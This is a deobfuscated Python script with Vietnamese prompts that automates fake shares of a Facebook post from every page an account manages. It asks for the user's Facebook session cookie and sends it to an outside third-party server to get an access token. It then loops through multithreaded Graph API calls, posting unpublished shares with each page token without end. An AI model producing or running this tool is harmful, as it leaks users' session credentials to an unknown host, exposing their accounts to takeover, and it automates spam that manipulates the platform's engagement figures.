#Deobfuscate by HuyAnh
#Zalo:0905491417
#huyanhnong.21

import requests,random,threading,os
list_token = []
# =========================== [ CLASS + FUNCTION TOOL ] ===========================
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = '''
\033[1;33m⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;32m             ██╗  ██╗██████╗ ████████╗          
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;31m             ██║  ██║██╔══██╗╚══██╔══╝          
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;33m             ███████║██║  ██║   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;36m             ██╔══██║██║  ██║   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;34m             ██║  ██║██████╔╝   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;30m             ╚═╝  ╚═╝╚═════╝    ╚═╝             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩                                   
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;32m         ████████╗ ██████╗  ██████╗ ██╗     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;31m         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;33m            ██║   ██║   ██║██║   ██║██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;36m            ██║   ██║   ██║██║   ██║██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;34m            ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;30m            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩  \033[1;32mTOOL SHARE ẢO MAX SPEED BẰNG PAGE PRO5
\033[1;33m⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦
'''
    print(banner)
class NguyenDucPhatCuteVcl:
    def gettoken(self, cookie):
        json_info = requests.get('https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie='+cookie).json()
        if json_info['status'] == 'success':
            return json_info
        else:
            return False
    def getpage(self, token):
        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        if 'id' in sharepost:
            idshare = sharepost['id']
            print(f'\033[1;31m[HDT] |\033[1;32m[UID SHARE]: \033[1;31m{idshare}| \033[1;33mTRẠNG THÁI: \033[1;35mSUCCESS ')
        else:
            print('[HDT] | TRẠNG THÁI: ERROR')
# =========================== [ START TOOL ] ===========================
banner()
while True:
    cookie = input('\033[1;33mVUI LÒNG NHẬP COOKIE FACEBOOK CHỨA PAGE: \033[1;31m')
    dpcute = NguyenDucPhatCuteVcl()
    checklive = dpcute.gettoken(cookie)
    if checklive != False:
        token = checklive['access_token']
        name  = checklive['name']
        uid   = checklive['id']
        print('─'*50)
        print(f'\033[1;34mTên FB: {name} | \033[1;31mID FB: \033[1;33m{uid}')
        print('─'*50)
        break
    else:
        print('Cookie Die Or Out Vui Lòng Nhập Lại!!')
        continue
id_post = input('\033[1;36mNhập ID Bài Viết : ')
print('─'*50)
luong = int(input('\033[1;35mVUI LÒNG NHẬP SỐ LUỒNG SHARE: '))
print('─'*50)
getpage = dpcute.getpage(token)
if getpage != False:
    print(f'\033[1;32mĐã Tìm Thấy | {len(getpage)} | Page', end='\r')
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print('Không Tìm Thấy Page Nào!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=dpcute.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()